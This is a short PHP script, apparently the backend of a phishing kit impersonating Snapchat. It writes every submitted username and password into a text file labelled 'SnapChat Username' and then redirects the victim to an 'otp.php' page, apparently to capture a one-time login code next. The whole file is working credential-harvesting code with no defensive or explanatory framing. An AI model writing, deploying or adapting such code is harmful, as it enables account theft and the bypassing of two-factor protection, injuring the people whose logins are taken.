<?php
file_put_contents("usernames.txt", "SnapChat Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.php');
exit();
?>
